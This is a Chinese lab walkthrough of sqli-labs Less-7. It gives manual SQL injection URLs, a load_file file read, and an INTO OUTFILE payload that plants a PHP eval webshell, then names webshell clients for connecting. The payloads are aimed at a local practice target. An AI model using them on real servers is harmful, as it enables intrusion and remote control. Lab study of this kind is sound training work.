# 原创
：  (手工)【sqli-labs7】GET请求、文件读写注入：使用方法

# (手工)【sqli-labs7】GET请求、文件读写注入：使用方法

**目录**

[ 推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、读写注入（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[二、Less7(GET-Dump into outfile - String)](#%E4%BA%8C%E3%80%81Less7%28GET-Dump%20into%20outfile%20-%20String%29)

[2.1、简介：（文件读写注入）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[2.2、第一步：注入点测试](#2.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[2.3、第二步：查询字段数](#2.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E6%95%B0)

[2.4、第三步：读取文件/写入文件](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%2F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6)

[2.5、第四步：使用菜刀、蚁剑、冰蝎等工具进行连接](#2.5%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E4%BD%BF%E7%94%A8%E8%8F%9C%E5%88%80%E3%80%81%E8%9A%81%E5%89%91%E3%80%81%E5%86%B0%E8%9D%8E%E7%AD%89%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5)

[下载、使用：](#%E4%B8%8B%E8%BD%BD%E3%80%81%E4%BD%BF%E7%94%A8%EF%BC%9A)

---


> 
<h2> 推荐：</h2>
[【SQL注入-文件读写】文件的读取+写入：函数、使用方法<img alt="icon-default.png?t=M4AD" src="https://csdnimg.cn/release/blog_editor_html/release2.1.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M4AD"/>https://blog.csdn.net/qq_53079406/article/details/125044475?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125044475?spm=1001.2014.3001.5501)


## 一、读写注入（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：查询字段数
第三步：读取文件/写入文件
第四步：使用菜刀、蚁剑、冰蝎等工具进行连接
第五步：执行各种操作


---


---


## 二、Less7(GET-Dump into outfile - String)

> 
<h3>2.1、简介：（文件读写注入）</h3>
请求方法：GET
方法：数据库读写注入的木马，然后菜刀、蚁剑、冰 蝎连接


> 
<h3>2.2、第一步：注入点测试</h3>
加上双引号，没有报错
http://localhost:8080/sqli-labs-master/Less-7/?id=1"



加上单引号，报错，说明是单引号闭合
且是字符型注入
且没有的具体的报错回显，就不能使用报错注入了
http://localhost:8080/sqli-labs-master/Less-7/?id=1'


发现报错，说明存在括号被注释了
http://localhost:8080/sqli-labs-master/Less-7/<br/> ?id=1' and 1=1 --+


判断括号个数
加一个括号
http://localhost:8080/sqli-labs-master/Less-7/<br/> ?id=1') and 1=1 --+


加2个括号
发现没有报错了，说明存在2个括号未被闭合
ttp://localhost:8080/sqli-labs-master/Less-7/<br/> ?id=1')) and 1=1 --+




> 
<h3>2.3、第二步：查询字段数</h3>
有2个的时候，报错
http://localhost:8080/sqli-labs-master/Less-7/<br/> ?id=-1')) union select 1,2 --+


3个的时候没报错，所以有3个字段数
http://localhost:8080/sqli-labs-master/Less-7/<br/> ?id=-1')) union select 1,2,3 --+




> 
<h3>2.4、第三步：读取文件/写入文件</h3>
爆破文件路径后，可以使用文件读取，去读取重要的文件
将读取函数注入到正常的查询语句中
例如：
union select 1,2,load_file(C:\\boot.ini)
<hr/>
写入一句话木马
虽然还是报错，但是在目录下，是已经写入进去的
http://localhost:8080/sqli-labs-master/Less-7/<br/> ?id=1')) union select 1,'&lt;?php eval($_REQUEST[123]); ?&gt;',3 into outfile 'D://BaiduNetdiskDownload/phpstudy/phpstudy_pro/WWW/sqli-labs-master/1.php' --+










 

> 
<h3>2.5、第四步：使用菜刀、蚁剑、冰蝎等工具进行连接</h3>

连接是需要知道文件路径
所以写入的的时候需要指定路径的
<hr/>
<h4>下载、使用：</h4>
[【WAF绕过-权限控制工具】菜刀、蚁剑、冰蝎 下载、使用方法<img alt="icon-default.png?t=M4AD" src="https://csdnimg.cn/release/blog_editor_html/release2.1.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M4AD"/>https://blog.csdn.net/qq_53079406/article/details/124871969?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165389617516781685342067%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165389617516781685342067&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-124871969-null-null.nonecase&amp;utm_term=%E8%8F%9C%E5%88%80&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/124871969?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165389617516781685342067%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165389617516781685342067&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-124871969-null-null.nonecase&amp;utm_term=%E8%8F%9C%E5%88%80&amp;spm=1018.2226.3001.4450)

此处以蚁剑为例
添加数据 










#### 下载、使用：
